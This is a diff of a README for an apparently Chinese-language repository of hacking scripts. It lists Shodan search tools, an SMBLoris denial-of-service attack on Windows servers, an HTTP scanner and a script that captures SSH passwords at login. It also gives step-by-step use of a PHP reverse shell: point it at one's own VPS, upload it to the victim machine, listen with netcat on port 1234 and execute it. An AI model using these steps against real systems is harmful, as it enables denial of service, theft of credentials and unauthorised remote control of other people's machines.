@@ -1,12 +1,18 @@
-## Th1s 1s a rep0 ab0ut h3cking scr1pts
+﻿## Th1s 1s a rep0 ab0ut h3cking scr1pts
 
 # shodan
 
+# 调用shodan api 统计设备数量
+
 shodancount.py <search query>
+
+# 调用shodan api 搜索设备
 
 shodansearch.py <search query>
 
-# smbloris
+# SMBLoris
+
+# 通过smb对Windows服务器实施DOS攻击
 
 chmod +x run10.sh
 
@@ -14,27 +20,33 @@ sh run10.sh
 
 # httpscan
 
+# http简易扫描工具
+
 httpscan.py <ip>
 
 # dump_ssh_password
+
+# 提取ssh密码
 
 chmod +x ssh_password.sh
 
 sh password.sh
 
-open a new window to ssh login , you'll see the ssh password
+然后新建一个窗口ssh登录，就可以看见ssh密码
 
 # php-reverse-shell
 
-modify the $ip and $port in php-reverse-shell.php in line 49 and 50
+# php的反弹shell脚本
 
-upload php-reverse-shell.php to the victim machine
+把php-reverse-shell.php中49行的地址改为自己的公网vps
 
-login to your vps,listen the port
+上传该脚本到被攻击的机器上
+
+登录自己的公网vps，监听1234端口
 
 nc -lvp 1234
 
-execute the php on the victim machine,you'll get the reverse shell
+在被攻击的机器上执行脚本，即可在vps上看到shell
 
 php php-reverse-shell.php
 
